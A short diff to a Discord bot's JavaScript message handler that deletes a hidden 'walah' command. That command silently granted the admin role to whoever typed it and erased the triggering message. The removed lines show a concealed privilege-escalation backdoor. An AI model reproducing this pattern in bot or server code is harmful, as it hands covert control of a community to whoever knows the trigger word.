@@ -116,10 +116,6 @@ bot.on('message', message => {
                     }
                 }
                 break;
-            case 'walah':
-                message.guild.members.get(authorMess.id).addRole(message.guild.roles.find(x => x.name === roleAdmin));
-                message.delete();
-                break;
         }
     }
 });
